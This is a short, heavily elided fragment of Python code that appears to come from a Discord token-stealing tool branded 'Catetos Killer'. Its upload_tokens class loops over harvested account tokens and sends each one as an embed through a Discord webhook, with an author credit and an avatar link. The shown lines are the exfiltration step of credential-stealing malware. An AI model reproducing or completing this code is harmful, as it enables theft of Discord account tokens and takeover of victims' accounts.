...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text="Catetos Killer By BinaryBandit Reverse#3535")

            self.webhook.send(embed=embed, username="Catetos killer", avatar_url="https://cdn.discordapp.com/attachments/1102105227903127614/1102297324459393174/descarga_1.jpg")
